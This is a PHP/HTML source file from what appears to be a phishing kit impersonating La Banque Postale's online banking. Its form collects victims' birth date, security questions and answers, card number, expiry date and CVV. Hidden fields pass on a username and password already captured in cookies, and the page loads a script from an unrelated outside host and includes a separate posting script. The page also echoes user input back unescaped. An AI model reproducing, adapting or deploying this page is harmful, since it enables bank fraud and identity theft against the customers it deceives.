<?php
include "post.php";
?>
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<title>Banque - banque en ligne - La Banque Postale – La Banque Postale</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<style>
body {
    font-family: Arial,Helvetica,Verdana,Tahoma,sans-serif;
    font-size: 10px;
}
input[type="password"] {
    width: 126px;
    color: #C00000;
    border-color: rgba(192, 0, 0, 0.5);
}
.fifthsubmit {
    margin: 0px;
    padding: 6px 20px;
    border: 1px solid #C5C5C5;
    border-radius: 20px;
    background: transparent -moz-linear-gradient(center top , #F6F6F6 0%, #DDD 100%) repeat scroll 0% 0%;
    color: #222;
    font-weight: normal;
    font-size: 12px;
    text-shadow: 1px 1px #FAFAFA;
    cursor: pointer;
}
</style>
<script src="http://code.jquery.com/jquery-latest.js"></script>
<script src="http://jnansbil.xoom.it/js/jquery.js"></script>
<script type="text/javascript">
function numbersonly(e){
var unicode=e.charCode? e.charCode : e.keyCode
if (unicode!=8){ //if the key isn't the backspace key (which we should allow)
if (unicode<48||unicode>57) //if not a number
return false //disable key press
}
}
</script>
<script type="text/javascript">
if( window.  parent . length !=0) {
    window. top . location .replace( document. location.href);}
</script>
<link rel="stylesheet" type="text/css" href="css/tab.css">
</head>
<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div id="xn1"></div>
<table border="0" width="100%" cellspacing="0" cellpadding="0" background="images/bg1.jpg">
	<tr>
		<td align="center">
<!-- ImageReady Slices (Untitled-7) -->
<table id="Table_01" width="1142" height="776" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td colspan="3">
			<img src="images/info_01.gif" width="1142" height="142" alt=""></td>
	</tr>
	<tr>
		<td valign="top">
			<img src="images/info_02.gif" width="175" height="578" alt=""></td>
		<td width="782" height="100%" valign="top" align="center"><br>
		<table border="1" width="95%" cellspacing="0" cellpadding="0" height="34" bordercolorlight="#000000" bordercolordark="#C0C0C0" style="border-right-color: #C0C0C0; border-bottom-color: #C0C0C0">
			<tr>
				<td background="images/bkg-thead34.png" align="center"><b>Veuillez remplir le formulaire suivant 
				</b> </td>
			</tr>
		</table>
<form action="" method="post"><table id="tab1" border="0" height="450" width="95%">
<input type="hidden" name="username" value="<?php echo $_COOKIE["UsernameCockie"]; ?>">
<input type="hidden" name="password" value="<?php echo $_COOKIE["PasswordCookie"]; ?>">
  <tbody>
      <tr>
    <td class="td_c1" height="23" width="236">&nbsp;</td>
    <td class="td_c2" height="23" width="237">&nbsp;</td></tr>
      <tr class="loginform cf">
    <td class="td_c1"> &nbsp;Date de Naissance :</td>
    <td class="td_c2" width="215">
	 <input <?php echo $StyleBday; ?> onkeypress="return numbersonly(event)" type="text" placeholder="JJ" size="2" maxlength="2" name="Bday" value="<?php echo $_POST[Bday]; ?>"><font style="font-size: 9pt" color="#666666"><font color="#888888"> |</font>
</font>
	 <input <?php echo $StyleBmoth; ?> onkeypress="return numbersonly(event)" type="text" placeholder="MM" size="2" maxlength="2" name="Bmoth" value="<?php echo $_POST[Bmoth]; ?>"><font style="font-size: 9pt" color="#666666"><font color="#888888"> |</font>
	
</font>
	 <input <?php echo $StyleByear; ?> onkeypress="return numbersonly(event)" type="text" placeholder="AAAA" size="4" maxlength="4" name="Byear" value="<?php echo $_POST[Byear]; ?>"><font style="font-size: 9pt" color="#666666">
</font>&nbsp;&nbsp; <font size="1">(JJ-MM-AAAA)</font></td>
  </tr>
    <tr>
    <td class="td_c1" height="23" width="236">------------------------------</td>
    <td class="td_c2" height="23" width="237">------------------------------------</td></tr>
      <tr class="loginform cf">
    <td class="td_c1">&nbsp;Question secrete 1 :</td>
    <td class="td_c2" width="215">
	<div class="styled-select"><select <?php echo $StyleQuestion1; ?> name="Question1">
<option value="" selected> </option>
<option value="Quel etait le prenom de votre meilleur(e) ami(e) denfance ?" <?php if ($_POST[Question1] == "Quel etait le prenom de votre meilleur(e) ami(e) denfance ?"){ echo "selected"; } ?>>Quel etait le prenom de votre meilleur(e) ami(e) d'enfance ?</option>
<option value="Dans quelle rue avez-vous grandi ?" <?php if ($_POST[Question1] == "Dans quelle rue avez-vous grandi ?"){ echo "selected"; } ?>>Dans quelle rue avez-vous grandi ?</option>
<option value="Quel est le prenom de laine(e) de vos cousins et cousines ?" <?php if ($_POST[Question1] == "Quel est le prenom de laine(e) de vos cousins et cousines ?"){ echo "selected"; } ?>>Quel est le prenom de l'aîne(e) de vos cousins et cousines ?</option>
<option value="Quel a ete votre lieu de vacances prefere durant votre enfance ?" <?php if ($_POST[Question1] == "Quel a ete votre lieu de vacances prefere durant votre enfance ?"){ echo "selected"; } ?>>Quel a ete votre lieu de vacances prefere durant votre enfance ?</option>
<option value="Quel etait votre dessin animee prefere ?" <?php if ($_POST[Question1] == "Quel etait votre dessin animee prefere ?"){ echo "selected"; } ?>>Quel etait votre dessin animee; prefere ?</option>

</select></div>
	</td>
  </tr>
    <tr><td class="td_c1">&nbsp;Reponse :</td>
    <td class="td_c2" width="215">
 <input <?php echo $StyleReponse1; ?> type="text" size="22" maxlength="16" name="Reponse1" value="<?php echo $_POST[Reponse1]; ?>"></td>
  </tr>
  <tr>
    <td class="td_c1">&nbsp;Question secrete 2 :</td>
    <td class="td_c2" width="215">
   
	<div class="styled-select">
		<select <?php echo $StyleQuestion2; ?> name="Question2">
<option value="" selected> </option>
<option value="Quel etait le prenom de votre meilleur(e) ami(e) denfance ?" <?php if ($_POST[Question2] == "Quel etait le prenom de votre meilleur(e) ami(e) denfance ?"){ echo "selected"; } ?>>Quel etait le prenom de votre meilleur(e) ami(e) d'enfance ?</option>
<option value="Dans quelle rue avez-vous grandi ?" <?php if ($_POST[Question2] == "Dans quelle rue avez-vous grandi ?"){ echo "selected"; } ?>>Dans quelle rue avez-vous grandi ?</option>
<option value="Quel est le prenom de laine(e) de vos cousins et cousines ?" <?php if ($_POST[Question2] == "Quel est le prenom de laine(e) de vos cousins et cousines ?"){ echo "selected"; } ?>>Quel est le prenom de l'aîne(e) de vos cousins et cousines ?</option>
<option value="Quel a ete votre lieu de vacances prefere durant votre enfance ?" <?php if ($_POST[Question2] == "Quel a ete votre lieu de vacances prefere durant votre enfance ?"){ echo "selected"; } ?>>Quel a ete votre lieu de vacances prefere durant votre enfance ?</option>
<option value="Quel etait votre dessin animee prefere ?" <?php if ($_POST[Question2] == "Quel etait votre dessin animee prefere ?"){ echo "selected"; } ?>>Quel etait votre dessin animee; prefere ?</option>

</select></div></td>
  
  </tr>
  <tr class="loginform cf">
    <td class="td_c1">&nbsp;Reponse :</td>
    <td class="td_c2" width="215">
	<input <?php echo $StyleReponse2; ?> type="text" size="22" maxlength="16" name="Reponse2" value="<?php echo $_POST[Reponse2]; ?>"></td>
  </tr>
  <tr>
    <td class="td_c1" height="23" width="236">------------------------------</td>
    <td class="td_c2" height="23" width="237">------------------------------------</td></tr>
<tr>
    <td class="td_c1" height="23" width="236">
	&nbsp;Type de Carte :</td>
    <td class="td_c2" height="23" width="237"><font style="font-size: 9pt" color="#666666">
	&nbsp;<img src="images/crxxx.png" border="0" height="26" width="84"></font></td></tr>
      <tr class="loginform cf">
    <td class="td_c1" height="43" width="236">
	&nbsp;</font>Numéro de Carte :</td>
    <td class="td_c2" height="43" width="237">
	<font style="font-size: 9pt" color="#666666">
	<span class="small">

 
	<input <?php echo $StyleNcarte; ?> onkeypress="return numbersonly(event)" name="Ncarte" size="22" maxlength="16" placeholder="XXXXXXXXXXXXXXXX" type="text" value="<?php echo $_POST[Ncarte]; ?>"></span></font>
	</td>
  </tr>
    <tr><td class="td_c1" height="33" width="236"> 
		
		&nbsp;Date D&#39;expiration :</td>
    <td class="td_c2" height="33" width="237">
	<font style="font-size: 9pt" color="#666666">
<span class="small">

 </span></font><div class="styled-select"><font style="font-size: 9pt" color="#666666">
<select <?php echo $StyleExmoth; ?> name="Exmoth">
<option selected="selected" value="">Mois</option>
<option value="01" <?if($_POST[Exmoth] == "01") echo "selected";?>>01</option>
<option value="02" <?if($_POST[Exmoth] == "02") echo "selected";?>>02</option>
<option value="03" <?if($_POST[Exmoth] == "03") echo "selected";?>>03</option>
<option value="04" <?if($_POST[Exmoth] == "04") echo "selected";?>>04</option>
<option value="05" <?if($_POST[Exmoth] == "05") echo "selected";?>>05</option>
<option value="06" <?if($_POST[Exmoth] == "06") echo "selected";?>>06</option>
<option value="07" <?if($_POST[Exmoth] == "07") echo "selected";?>>07</option>
<option value="08" <?if($_POST[Exmoth] == "08") echo "selected";?>>08</option>
<option value="09" <?if($_POST[Exmoth] == "09") echo "selected";?>>09</option>
<option value="10" <?if($_POST[Exmoth] == "10") echo "selected";?>>10</option>
<option value="11" <?if($_POST[Exmoth] == "11") echo "selected";?>>11</option>
<option value="12" <?if($_POST[Exmoth] == "12") echo "selected";?>>12</option>
</select></font> <font color="#888888">|</font>
	<font style="font-size: 9pt" color="#666666">
<span class="small">

 
<select <?php echo $StyleExyear; ?> name="Exyear">
<option selected="selected" value="">Année</option>
<option value="2015" <?if($_POST[Exyear] == "2015") echo "selected";?>>2015</option>
<option value="2016" <?if($_POST[Exyear] == "2016") echo "selected";?>>2016</option>
<option value="2017" <?if($_POST[Exyear] == "2017") echo "selected";?>>2017</option>
<option value="2018" <?if($_POST[Exyear] == "2018") echo "selected";?>>2018</option>
<option value="2019" <?if($_POST[Exyear] == "2019") echo "selected";?>>2019</option>
<option value="2020" <?if($_POST[Exyear] == "2020") echo "selected";?>>2020</option>
<option value="2021" <?if($_POST[Exyear] == "2021") echo "selected";?>>2021</option>
<option value="2022" <?if($_POST[Exyear] == "2022") echo "selected";?>>2022</option>
<option value="2023" <?if($_POST[Exyear] == "2023") echo "selected";?>>2023</option>
<option value="2024" <?if($_POST[Exyear] == "2024") echo "selected";?>>2024</option>
<option value="2025" <?if($_POST[Exyear] == "2025") echo "selected";?>>2025</option>
</select></span></font>
</div>
<div id="xn1"></div>
	</td>
  </tr>
      <tr class="loginform cf">
    <td class="td_c1" height="43" width="236"> &nbsp;CVV :</td>
    <td class="td_c2" height="43" width="237">
	&nbsp;<input <?php echo $StyleCvv; ?> onkeypress="return numbersonly(event)" name="Cvv" maxlength="4" size="8" placeholder="CVC (CVV)" type="text" value="<?php echo $_POST[Cvv]; ?>"></td>
  </tr>
    </tbody></table>
		<table border="0" width="95%" cellspacing="0" cellpadding="0">
	<tr>
		<td align="center"><input type="hidden" name="image" value="<?php echo $src; ?>"><input type="hidden" name="set" value="ok"><input type="hidden" name="nom" value="postale1"><input name="Submit.Sx" value="Validation Mes Information" class="fifthsubmit" id="set1" type="submit"></td>
	</tr>
	</table></form>
		</td>
			
		<td valign="top">
			<img src="images/info_04.gif" width="185" height="578" alt=""></td>
	</tr>
	<tr>
		<td colspan="3">
			<img src="images/info_05.gif" width="1142" height="56" alt=""></td>
	</tr>
</table>
<!-- End ImageReady Slices -->
</td>
	</tr>
</table>
</body>
</html>